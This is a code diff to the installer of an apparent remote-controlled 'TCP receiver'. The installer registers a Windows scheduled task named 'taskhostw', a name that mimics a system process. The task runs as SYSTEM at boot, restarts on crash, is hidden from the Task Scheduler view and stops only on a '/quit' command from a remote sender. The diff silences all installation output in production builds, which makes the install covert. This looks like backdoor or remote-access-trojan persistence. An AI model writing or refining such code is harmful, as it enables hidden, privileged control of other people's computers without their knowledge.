@@ -11,6 +11,42 @@ from typing import Tuple, Optional
 
 
 # ============================================================================
+# VERBOSITY DETECTION (Shared with receiver.py)
+# ============================================================================
+
+
+def is_dev_build() -> bool:
+    """
+    Check if this is a development build.
+
+    Returns True if:
+    - Running as Python script (development)
+    - Running as compiled exe with .dev_mode marker file (--dev build)
+
+    Returns False if:
+    - Running as compiled exe without .dev_mode marker (production build)
+    """
+    # Running as Python script? Always development mode
+    if not (getattr(sys, "frozen", False) or "__compiled__" in globals()):
+        return True
+
+    # Running as compiled exe - check for .dev_mode marker file
+    exe_dir = os.path.dirname(os.path.abspath(sys.executable))
+    marker_file = os.path.join(exe_dir, ".dev_mode")
+    return os.path.exists(marker_file)
+
+
+# Shared VERBOSE flag for both receiver.py and install.py
+VERBOSE = is_dev_build()
+
+
+def log(msg: str) -> None:
+    """Print message only if VERBOSE is True."""
+    if VERBOSE:
+        print(msg)
+
+
+# ============================================================================
 # HELPER FUNCTIONS
 # ============================================================================
 
@@ -106,12 +142,12 @@ def check_and_install_service() -> None:
         return
 
     # Not installed - install it
-    print("First run detected - installing Windows service...\n")
+    log("First run detected - installing Windows service...\n")
     if install_windows_task():
-        print("\n✓ Installation complete! Receiver will start automatically on boot.")
-        print("  Continuing to run...\n")
+        log("\n✓ Installation complete! Receiver will start automatically on boot.")
+        log("  Continuing to run...\n")
     else:
-        print("\n✗ Installation failed. Continuing anyway...\n")
+        log("\n✗ Installation failed. Continuing anyway...\n")
 
 
 def install_windows_task() -> bool:
@@ -128,16 +164,16 @@ def install_windows_task() -> bool:
 
     xml_file = os.path.join(workdir, "tcp-receiver-task.xml")
 
-    print("\n=== Installing TCP Receiver (Windows Task Scheduler) ===\n")
-    print("Task name: taskhostw")
-    print(f"Receiver script: {receiver_path}")
-    print("\nTask will:")
-    print("  • Start automatically at system boot")
-    print("  • Run as SYSTEM with highest privileges")
-    print("  • Restart automatically on crashes (double-layer protection)")
-    print("  • Only stop via /quit command from sender")
-    print("  • Hidden from Task Scheduler view")
-    print("  • Only run when network is available\n")
+    log("\n=== Installing TCP Receiver (Windows Task Scheduler) ===\n")
+    log("Task name: taskhostw")
+    log(f"Receiver script: {receiver_path}")
+    log("\nTask will:")
+    log("  • Start automatically at system boot")
+    log("  • Run as SYSTEM with highest privileges")
+    log("  • Restart automatically on crashes (double-layer protection)")
+    log("  • Only stop via /quit command from sender")
+    log("  • Hidden from Task Scheduler view")
+    log("  • Only run when network is available\n")
 
     try:
         # Write XML to file
@@ -153,22 +189,22 @@ def install_windows_task() -> bool:
         os.remove(xml_file)
 
         if cmd_result.returncode != 0:
-            print(f"Error: {cmd_result.stderr}")
+            log(f"Error: {cmd_result.stderr}")
             return False
 
-        print("✓ Task installed successfully!\n")
-        print("Useful commands:")
-        print('  schtasks /query /tn "taskhostw"           # Check status')
-        print('  schtasks /run /tn "taskhostw"             # Start manually')
-        print('  schtasks /end /tn "taskhostw"             # Stop task (will restart)')
-        print("\nTo permanently uninstall:")
-        print('  Send "/quit" command from sender.py')
-        print('  OR: schtasks /delete /tn "taskhostw" /f')
-        print("\nThe receiver will start automatically at next boot.")
+        log("✓ Task installed successfully!\n")
+        log("Useful commands:")
+        log('  schtasks /query /tn "taskhostw"           # Check status')
+        log('  schtasks /run /tn "taskhostw"             # Start manually')
+        log('  schtasks /end /tn "taskhostw"             # Stop task (will restart)')
+        log("\nTo permanently uninstall:")
+        log('  Send "/quit" command from sender.py')
+        log('  OR: schtasks /delete /tn "taskhostw" /f')
+        log("\nThe receiver will start automatically at next boot.")
         return True
 
     except Exception as e:
-        print(f"Error: {e}")
+        log(f"Error: {e}")
         if os.path.exists(xml_file):
             os.remove(xml_file)
         return False
@@ -181,17 +217,17 @@ def install_autostart() -> bool:
     if system == "Windows":
         return install_windows_task()
     elif system == "Linux":
-        print("\nLinux: No auto-start service needed.")
-        print("Run receiver.py manually: python3 receiver.py")
-        print("Stop with Ctrl+C when done.\n")
+        log("\nLinux: No auto-start service needed.")
+        log("Run receiver.py manually: python3 receiver.py")
+        log("Stop with Ctrl+C when done.\n")
         return False
     elif system == "Darwin":
-        print("\nmacOS: No auto-start service needed.")
-        print("Run receiver.py manually: python3 receiver.py")
-        print("Stop with Ctrl+C when done.\n")
+        log("\nmacOS: No auto-start service needed.")
+        log("Run receiver.py manually: python3 receiver.py")
+        log("Stop with Ctrl+C when done.\n")
         return False
     else:
-        print(f"Unsupported platform: {system}")
+        log(f"Unsupported platform: {system}")
         return False
 
 
